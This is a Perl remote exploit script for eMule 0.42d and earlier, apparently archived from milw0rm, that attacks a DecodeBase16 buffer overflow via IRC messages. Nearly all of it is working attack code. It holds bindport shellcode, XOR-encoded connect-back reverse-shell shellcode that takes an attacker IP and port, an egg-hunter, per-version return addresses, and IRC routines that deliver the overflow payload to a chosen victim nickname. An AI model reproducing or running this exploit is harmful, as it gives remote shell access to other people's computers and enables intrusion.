#!/usr/bin/perl
#
# eMule <= 0.42d Remote Exploit by kcope
# 
# exploits the DecodeBase16 buffer overflow
# tested on WinXP SP1 / Win2k SP4
# bindport/connectback shellcode
#
# thanks Kostya Kortchinsky for his posting to bugtraq
# 
# greetings to sander, blackzero, beginna, adize, A-cru and wY :p
# have fun!
#
# kcope, kingcope gmx net Apr 2004
#

use Socket;
use Getopt::Std;

# bindport shellcode (port 2004) thanks to metasploit
$sc = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x21\x39".
"\x11\x09\x83\xeb\xfc\xe2\xf4\xc9\x6f\x11\x09\x21\x6a\x44\x5f\x76".
"\xb2\x7d\x2d\x39\xb2\x54\x35\xaa\x6d\x14\x71\x20\xd3\x9a\x43\x39".
"\xb2\x4b\x29\x20\xd2\xf2\x3b\x68\xb2\x25\x82\x20\xd7\x20\xf6\xdd".
"\x08\xd1\xa5\x19\xd9\x65\x0e\xe0\xf6\x1c\x08\xe6\xd2\xe3\x32\x5d".
"\x1d\x05\x7c\xc0\xb2\x4b\x2d\x20\xd2\x77\x82\x2d\x72\x9a\x53\x3d".
"\x38\xfa\x82\x25\xb2\x10\xe1\xca\x3b\x20\xc9\x7e\x67\x4c\x52\xe3".
"\x31\x11\x57\x4b\x09\x48\x6d\xaa\x20\x9a\x52\x2d\xb2\x4a\x15\xaa".
"\x22\x9a\x52\x29\x6a\x79\x87\x6f\x37\xfd\xf6\xf7\xb0\xd6\x88\xcd".
"\x39\x10\x09\x21\x6e\x47\x5a\xa8\xdc\xf9\x2e\x21\x39\x11\x99\x20".
"\x39\x11\xbf\x38\x21\xf6\xad\x38\x49\xf8\xec\x68\xbf\x58\xad\x3b".
"\x49\xd6\xad\x8c\x17\xf8\xd0\x28\xcc\xbc\xc2\xcc\xc5\x2a\x5e\x72".
"\x0b\x4e\x3a\x13\x39\x4a\x84\x6a\x19\x40\xf6\xf6\xb0\xce\x80\xe2".
"\xb4\x64\x1d\x4b\x3e\x48\x58\x72\xc6\x25\x86\xde\x6c\x15\x50\xa8".
"\x3d\x9f\xeb\xd3\x12\x36\x5d\xde\x0e\xee\x5c\x11\x08\xd1\x59\x71".
"\x69\x41\x49\x71\x79\x41\xf6\x74\x15\x98\xce\x10\xe2\x42\x5a\x49".
"\x3b\x11\x0e\xf5\xb0\xf1\x63\x31\x69\x46\xf6\x74\x1d\x42\x5e\xde".
"\x6c\x39\x5a\x75\x6e\xee\x5c\x01\xb0\xd6\x61\x62\x74\x55\x09\xa8".
"\xda\x96\xf3\x10\xf9\x9c\x75\x05\x95\x7b\x1c\x78\xca\xba\x8e\xdb".
"\xba\xfd\x5d\xe7\x7d\x35\x19\x65\x5f\xd6\x4d\x05\x05\x10\x08\xa8".
"\x45\x35\x41\xa8\x45\x35\x45\xa8\x45\x35\x59\xac\x7d\x35\x19\x75".
"\x69\x40\x58\x70\x78\x40\x40\x70\x68\x42\x58\xde\x4c\x11\x61\x53".
"\xc7\xa2\x1f\xde\x6c\x15\xf6\xf1\xb0\xf7\xf6\x54\x39\x79\xa4\xf8".
"\x3c\xdf\xf6\x74\x3d\x98\xca\x4b\xc6\xee\x3f\xde\xea\xee\x7c\x21".
"\x51\x6f\xd1\xc3\x4a\xee\x5c\x25\x08\xca\x5a\xde\xe9\x11\x09";

# connect back shellcode by lion, xor 0x21 
$cbsc = 
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x21\xE2\xFA".
"\xEB\x05\xE8\xEB\xFF\xFF\xFF".
"\xC8\xDA\x21\x21\x21\x7E\x45\x80\x11\x21\x21\x21\xAA\x61\x2D\xAA".
"\x51\x3D\x8C\xAA\x49\x29\xAA\xD6\x4B\x25\x78\xC9\xBA\x21\x21\x21".
"\xC3\xD8\x49\x12\x13\x21\x21\x49\x56\x52\x13\x7E\x75\xDE\x37\xAA".
"\xC9\x4B\x25\x78\xC9\xA3\x21\x21\x21\xC3\xD8\xA0\xCD\xB1\x20\x21".
"\x21\x75\x49\x20\x20\x21\x21\xDE\x77\x31\x71\x71\x71\x71\x61\x71".
"\x61\x71\xDE\x77\x35\xAA\xF9\x49\x5E\x21\x21\x20\x49\x23\x21\x21".
"\x14\xAA\xED\x4B\x31\x70\x72\xDE\x77\x39\xA4\xE1\x54\x6B\x49\x42".
"\x4C\x45\x21\xA8\x47\x11\xA2\xCD\x75\xAC\x1D\x05\x4B\x34\x78\x8A".
"\xC3\xDC\xE7\x65\x05\x31\x65\xDF\x65\x05\x1C\xA8\x7D\x05\x69\xA8".
"\x7D\x05\x6D\xA8\x7D\x05\x71\xAC\x65\x05\x31\x75\x71\x70\x70\x70".
"\x4B\x20\x70\x70\xDE\x57\x11\x70\xDE\x77\x25\xAA\xED\x4B\xDE\xDE".
"\x10\xDE\x77\x29\x72\xDE\x77\x3D\xDE\x77\x2D\x70\x77\xAA\x64\x1D".
"\xAA\x75\x09\x59\x22\xF4\x73\xAA\x53\x01\x22\xD4\x12\xE8\x68\x60".
"\x8C\x22\xE4\x12\xFA\x2E\x9F\x31\x1B\xF7\x55\x29\xE0\xEA\x2C\x22".
"\xFB\x61\xCA\xD0\x1A\x3E\x54\xC6\x7B\xAA\x7B\x05\x22\xFC\x47\xAA".
"\x2D\x6A\xAA\x7B\x3D\x22\xFC\xAA\x25\xAA\x22\xE4\x8A\x7F\x78\xE2".
"\xC9\x21\xDE\xDE\xDE\xAF\x6F\x2F\xCD\x53\xDF\x92\x37\x8C\xF8\x24".
"\xEF\x5F\xF9\xC3\x52\xEA\xCC\xDD\x1A\xF8\x28\xD4\x8C\xCD\xD8\x8B".
"\x41\xC6\x58\xE7\x58";

# find shellcode in memory
$find_sc = "648B3D08000000BA0100000042424264".
"8B1A8BCB2BCFB0D9909090FCF2AE803F".
"EE9075F8807F01D975F2BA0100000042".
"803C3A7475E64FFFE79090";

$find_sccb = "648B3D08000000BA0100000042424264".
"8B1A8BCB2BCFB0EB909090FCF2AE803F".
"109075F8807F015B75F2BA0100000042".
"803C3A4B75E64FFFE79090"; 

$numtargets = 4;

@targets = 
(
["eMule 0.42d", "7af65700", 76],
["eMule 0.42c", "514c5f00", 76],
["eMule 0.42b (Hotfix)", "d12e5f00", 76],
["eMule 0.42a", "012f5f00", 76]
# ["eMule 0.30e", "acf65b00", 20]
);

$exploiting_nick = "eMuleIRC3713"; # change this nickname if needed

sub connecttoserver()
{
$bool = "yes";
$iaddr = inet_aton($ircserver) || die("Failed to find host: $ircserver");
$paddr = sockaddr_in($ircport, $iaddr);
$proto = getprotobyname('tcp');
socket(SOCK1, PF_INET, SOCK_STREAM, $proto) || die("Failed to open socket:$!");
connect(SOCK1, $paddr) || {$bool = "no"};
}

sub usage() {

print "usage: emule4x.pl -n <nick> -s <server> <-t type> [-p port] [-c <ip:port>]\r\n".
"use -c switch for reverse shell\r\n". 
"example: perl emule4x.pl -n emuleuser -s irc.somenet.com -t 0\r\n\r\ntarget types:\r\n";

for ($i=0; $i<$numtargets; $i++) {
print "\t[".$i."]...". $targets[$i][0]. "\r\n";
} 
exit;
}

$| = 1;
print "\r\n----------------------------------------------------------------------\r\n";
print "eMule <= 0.42d Remote Exploit by kcope . kingcope[at]gmx.net\r\n\r";
print "Tested on Win2k SP4/WinXP SP1\r\n";
print "----------------------------------------------------------------------\r\nLets have fun!\r\n\r\n";

if (@ARGV < 4) {
usage(); 
}

%options=();
getopt("scnpt",\%options);

$nickname = $options{n};
$ircserver = $options{s};
$type = $options{t};

if (!defined $targets[$type][0]) {
print "Invalid target type.\r\n";
exit;
}

if (!defined $type) {
print "Please specify a target type.\r\n";
exit;
}

if (defined $options{p}) {
$ircport = $options{p};
} else {
$ircport = 6667;
}

$usecb=-1;
if (defined $options{c}) {
$usecb=1;
$idx = index $options{c},":";
$cbip = substr $options{c},0,$idx;
$cbport = substr $options{c},$idx+1; 
}

print "Target type set to ".$targets[$type][0].".\r\n";
$ret = $targets[$type][1];
$nops1 = "90" x $targets[$type][2];
$nops2 = "90" x 40; # customize if needed

if ($usecb eq 1) {
($a1, $a2, $a3, $a4) = split(//, gethostbyname("$cbip"));
$a1 = chr(ord($a1) ^ 0x21);
$a2 = chr(ord($a2) ^ 0x21);
$a3 = chr(ord($a3) ^ 0x21);
$a4 = chr(ord($a4) ^ 0x21);
substr($cbsc, 111, 4, $a1 . $a2 . $a3 . $a4);

($p1, $p2) = split(//, reverse(pack("s", $cbport)));
$p1 = chr(ord($p1) ^ 0x21);
$p2 = chr(ord($p2) ^ 0x21);
substr($cbsc, 118, 2, $p1 . $p2);

print "Using connect back method on $cbip port $cbport.\r\n";
}

print "Connecting to $ircserver on port $ircport...";

connecttoserver();

if ($bool eq "no")
{
print "Connection refused.\r\n";
exit(0);
}

send(SOCK1,"NICK $exploiting_nick\r\n",0);
send(SOCK1,"USER $exploiting_nick \"yahoo.com\" \"eu.dal.net\" :$exploiting_nick\r\n",0);

while (<SOCK1>) { 
$line = $_;
# print $line;
if ((index $line, " 376 ") ne -1) {
goto logged_in; 
}

if ((index $line, "PING") ne -1) {
substr($line,1,1,"O");
send(SOCK1, $line, 0); 
}
}

logged_in:

print " ok\r\n"; 
sleep(4); 
print "Sending buffers to $nickname...";

# 005f4c51 eMule 0.42c (514c5f00)
# 0057f67a eMule 0.42d (7AF65700)

if ($usecb eq 1) {
send(SOCK1, "PRIVMSG $nickname :$cbsc\r\n", 0);
send(SOCK1, "PRIVMSG $nickname :\x01SENDLINK\|" . $nops1 . "EB079090". $ret .
"906681EC4000". $nops2 . $find_sccb ."\|\x01\r\n", 0);
} else {
send(SOCK1, "PRIVMSG $nickname :$sc\r\n", 0);
send(SOCK1, "PRIVMSG $nickname :\x01SENDLINK\|" . $nops1 . "EB079090". $ret .
"906681EC4000". $nops2 . $find_sc ."\|\x01\r\n", 0); 
}

if ($usecb ne 1) {
print "\r\nNow try connecting to ".$nickname."'s ip on port 2004.\r\n";
} else {
print "\r\nWatch at your netcat for some shell.\r\n"; 
}

$recv = <SOCK1>;
$recv = <SOCK1>;
$recv = <SOCK1>;
$recv = <SOCK1>;
$recv = <SOCK1>;
$recv = <SOCK1>;
$recv = <SOCK1>;
$recv = <SOCK1>;
$recv = <SOCK1>;
print " done\r\n";

# EOF 

# milw0rm.com [2004-04-12]